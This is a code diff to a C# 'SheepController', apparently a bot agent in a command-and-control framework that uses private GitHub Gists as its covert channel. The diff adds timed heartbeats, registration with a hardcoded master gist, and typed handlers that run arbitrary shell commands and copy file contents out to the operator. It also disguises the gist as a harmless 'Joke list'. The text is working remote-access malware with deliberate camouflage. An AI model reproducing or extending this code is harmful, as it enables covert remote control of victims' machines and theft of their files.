@@ -1,5 +1,6 @@
 ﻿using Octokit;
 using Pasture;
+using Pasture.Messages;
 
 namespace Sheep.Core;
 
@@ -7,7 +8,10 @@ public class SheepController
 {
     private GitHubClient _client;
     private GistComment? _startingComment;
-    private string _gistId;
+    private string? _gistId;
+
+    private Timer _heartBeatTimer;
+
     public string SheepId { get; private set; }
 
     private IDictionary<int, GistComment> _processedComments = new Dictionary<int, GistComment>();
@@ -16,6 +20,12 @@ public class SheepController
     {
         SheepId = sheepId;
         _client = ConnectGitHubClient();
+    }
+
+    private void SendHeartBeat(object? state)
+    {
+        var message = new HeartBeatMessage(DateTimeOffset.UtcNow);
+        _client.Gist.Comment.Create(_gistId, message.GetTransportFormat());
     }
 
     private GitHubClient ConnectGitHubClient()
@@ -36,14 +46,13 @@ public class SheepController
 
         foreach (var comment in comments)
         {
-            var parts = comment.Body.Split("%");
-            var commentSheepId = parts[0];
-            var commentGistId = parts[1];
-
-            if (commentSheepId == SheepId)
+            if (AssignmentMessage.TryParse(comment.Body, out var assignmentMessage) &&
+                assignmentMessage.SheepId == SheepId)
             {
                 Console.WriteLine("Gist found!");
-                _gistId = commentGistId;
+                _gistId = assignmentMessage.GistId;
+                
+                _heartBeatTimer = new Timer(SendHeartBeat, null, 0, 1000 * 60 * 15);
                 return;
             }
         }
@@ -52,15 +61,20 @@ public class SheepController
         var newGist = new NewGist()
         {
             Public = false,
-            Description = $"Sheep {SheepId}"
+            Description = $"Joke list id: {SheepId}"
         };
-        newGist.Files.Add("Dummy", "Dummy");
+        newGist.Files.Add("Jokes! 😜",
+            "In this file I am going to collect my favorite jokes! Have fun reading them! 😂");
 
         var gist = await _client.Gist.Create(newGist);
         _gistId = gist.Id;
 
         _startingComment =
-            await _client.Gist.Comment.Create("652bac55c3f50e604c1882abbec27c27", $"{SheepId}%{_gistId}");
+            await _client.Gist.Comment.Create("652bac55c3f50e604c1882abbec27c27",
+                new AssignmentMessage(SheepId, _gistId).GetTransportFormat());
+        
+        _heartBeatTimer = new Timer(SendHeartBeat, null, 0, 1000 * 60 * 15);
+        
     }
 
     public async Task End()
@@ -84,35 +98,42 @@ public class SheepController
 
     private async Task ProcessMessage(CommandMessage commandMessage, int commentId)
     {
-        if (commandMessage.Command.Contains("w "))
+        string response;
+        ResponseMessage responseMessage;
+
+        switch (commandMessage.Type)
         {
-            var response = await CommandExecutor.ExecuteCommandW();
-            ResponseMessage responseMessage = new ResponseMessage(commentId, response); 
-            await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
-        }
-        else if (commandMessage.Command.Contains("ls "))
-        {
-            var response = await CommandExecutor.ExecuteCommandLs(commandMessage.Command);
-            ResponseMessage responseMessage = new ResponseMessage(commentId, response); 
-            await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
-        }
-        else if (commandMessage.Command.Contains("id "))
-        {
-            var response = await CommandExecutor.ExecuteCommandW();
-            ResponseMessage responseMessage = new ResponseMessage(commentId, response); 
-            await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
-        }
-        else if (commandMessage.Command.Contains("cp "))
-        {
-            var response = await CommandExecutor.ExecuteCommandCopy();
-            ResponseMessage responseMessage = new ResponseMessage(commentId, response); 
-            await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
-        }
-        else
-        {
-            var response = await CommandExecutor.ExecuteCommand(commandMessage.Command);
-            ResponseMessage responseMessage = new ResponseMessage(commentId, response); 
-            await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
+            case CommandType.W:
+                response = await CommandExecutor.ExecuteCommandW();
+                responseMessage = new ResponseMessage(commentId, commandMessage.Type, response);
+                await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
+                break;
+            case CommandType.Ls:
+                response = await CommandExecutor.ExecuteCommandLs(commandMessage.Parameters);
+                responseMessage = new ResponseMessage(commentId, commandMessage.Type, response);
+                await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
+                break;
+            case CommandType.Id:
+                response = await CommandExecutor.ExecuteCommandId();
+                responseMessage = new ResponseMessage(commentId, commandMessage.Type, response);
+                await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
+                break;
+            case CommandType.Cp:
+                var filePath = commandMessage.Parameters;
+                int pos = filePath.LastIndexOf("/", StringComparison.Ordinal) + 1;
+                var fileName = filePath.Substring(pos, filePath.Length - pos);
+                var fileContent = await CommandExecutor.ExecuteCommandCopy(filePath);
+
+                responseMessage = new ResponseMessage(commentId, commandMessage.Type, fileContent);
+                await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
+                break;
+            case CommandType.Execute:
+                response = await CommandExecutor.ExecuteCommand(commandMessage.Parameters);
+                responseMessage = new ResponseMessage(commentId, commandMessage.Type, response);
+                await _client.Gist.Comment.Create(_gistId, responseMessage.GetTransportFormat());
+                break;
+            default:
+                throw new ArgumentOutOfRangeException();
         }
 
         commandMessage.Answered = true;
